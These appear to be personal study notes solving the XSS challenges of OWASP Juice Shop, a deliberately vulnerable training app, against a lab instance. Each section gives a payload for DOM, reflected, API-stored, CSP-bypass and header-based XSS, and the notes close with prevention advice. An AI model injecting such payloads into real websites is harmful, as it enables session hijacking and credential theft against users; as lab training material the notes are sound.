
# OWASP Juice Shop – Scoreboard Notes

## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is one of the most critical web application security risks.  
It allows attackers to inject malicious scripts into trusted websites, causing visitors’ browsers to execute untrusted code.  
This can lead to **credential theft, session hijacking, or even full system compromise.**

---

### 1. DOM XSS (Document Object Model XSS)

**Payload:**
```html
<iframe src="javascript:alert(`xss`)">
````

* Vulnerable Parameter: `Dashboard → Search Input`
* Example InURL:

```
http://10.250.207.145:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
```

---

### 2. Bonus Payload (Audio Autoplay XSS)

This payload embeds a **SoundCloud player** that automatically plays audio.

**Payload:**

```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" 
src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&auto_play=true">
</iframe>
```

* Vulnerable Parameter: `Dashboard → Search Input`
* Encoded Payload Example:

```
http://10.250.207.145:3000/#/search?q=%3C%69%66%72%61%6D%65%20%77...
```

🔗 Encode/Decode Tool: [https://scriptasylum.com/tutorials/encode-decode.html](https://scriptasylum.com/tutorials/encode-decode.html)

### 3. Reflected XSS

**Payload:**

```html
<iframe src="javascript:alert(`xss`)">
```

* Vulnerable Parameter: `Track Order → id`
* Example InURL:

```
http://10.250.207.145:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">
```

**Frontend Issue:** Uses `innerHTML` instead of `innerText`/`textContent`.

---

### 4. API-only XSS (Stored in Backend via API)

**Payload:**

```html
<iframe src="javascript:alert(`xss`)">
```

**Request Example (Burp Suite):**

```http
PUT /api/Products/1 HTTP/1.1
Content-Type: application/json

{
  "name": "<iframe src='javascript:alert(`xss`)' >"
}
```

* Payload stored in **database** via API.
* Rendered later in frontend due to `innerHTML`.

---

### 5. Client-side XSS Protection Bypass

Attack works by bypassing client-side validation.

**Payload in Registration (Email field):**

```json
"email": "<iframe src=\"javascript:alert(`xss`)\">"
```

✅ **Fix / Prevention:**

* Server-side sanitization (remove dangerous tags).
* Encode output using `innerText` / `textContent`.

---

### 6. CSP Bypass (Content Security Policy)

**Payload:**

```html
<script>alert(`xss`)</script>
```

* Works on legacy page with weak CSP:

```
script-src 'self' 'unsafe-eval' 'unsafe-inline';
```

🔗 Reference: [How to Trick CSP](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

---

### 7. HTTP Header XSS

Injecting payload via **headers** like `X-Forwarded-For`, `True-Client-IP`.

**Example Header:**

```http
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```

🔗 Reference: [PortSwigger – Spoofable Client IP Address](https://portswigger.net/kb/issues/00400110_spoofable-client-ip-address)

## ✅ Key Fixes / Prevention

* Always use **output encoding** (`innerText`, `textContent`).
* Perform **server-side sanitization** (strip dangerous HTML/JS).
* Implement **strong CSP** rules.
* Validate input on **both client and server**.
* Encode user-generated content before rendering.
